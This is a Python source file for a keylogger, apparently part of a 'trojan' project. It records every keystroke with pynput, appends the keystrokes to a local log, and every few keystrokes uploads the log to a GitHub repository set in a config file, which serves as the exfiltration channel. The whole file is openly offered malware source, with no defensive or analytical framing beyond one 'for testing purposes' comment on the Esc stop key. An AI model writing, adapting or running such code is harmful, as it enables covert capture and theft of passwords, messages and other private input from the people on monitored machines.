import pynput.keyboard as keyboard
from pynput.keyboard import Listener
from trojan.localdata_dir import DirectoryHelper
from trojan.github_helper import GithubHelper
from config_reader import ConfigReader


class Keylogger:
    def __init__(self, filename, repo_name, push_to_github_amount=10):
        self.file_name = filename
        self.repo_name = repo_name
        self.push_to_github_amount = push_to_github_amount
        self.counter = 0

    def check_if_file_exists(self, content, github_helper):
        try:
            existing_sha = github_helper.get_sha(self.repo_name, file_name)
        except:
            existing_sha = None

        if existing_sha is None:
            # File doesn't exist, create it with an initial commit
            github_helper.create_file(self.repo_name, file_name, "First keylogger commit", content)
        else:
            # File already exists, update its contents
            github_helper.create_file(self.repo_name, file_name, "Log keylogger", content, sha=existing_sha)

    def keylogger(self, key):

        folder_path = DirectoryHelper().create_dir()
        log_file_path = f"{folder_path}/{file_name}"

        with open(log_file_path, 'a') as file:
            if key == keyboard.Key.enter:
                file.write('\n')
            elif key == keyboard.Key.space:
                file.write(' ')
            else:
                file.write(str(key).strip("''"))
            self.counter += 1
            if self.counter % self.push_to_github_amount == 0:
                # Upload the file to the repository every push_to_github_amount keystrokes
                with open(log_file_path, 'r') as log_file:
                    content = log_file.read()
                github_helper = GithubHelper()
                try:
                    existing_sha = github_helper.get_sha(self.repo_name, self.file_name)
                    github_helper.create_file(self.repo_name, self.file_name, "Log keys", content, sha=existing_sha)
                except Exception as e:
                    self.check_if_file_exists(content, github_helper)
                    # print("Exception occurred during file creation:", e)

            # For testing purposes only, if press esc the keylogger will stop
            if key == keyboard.Key.esc:  # Check if the "Esc" key is pressed
                listener.stop()  # Terminate the listener


if __name__ == '__main__':
    reader = ConfigReader()
    file_name = reader.getvar("keylogger", "file_name")
    repo_name = reader.getvar("keylogger", "repo_name")
    push_to_github_amount = int(reader.getvar("keylogger", "push_to_github_amount"))

    keylogger = Keylogger(file_name, repo_name, push_to_github_amount)
    with Listener(on_press=lambda key: keylogger.keylogger(key)) as listener:
        listener.join()
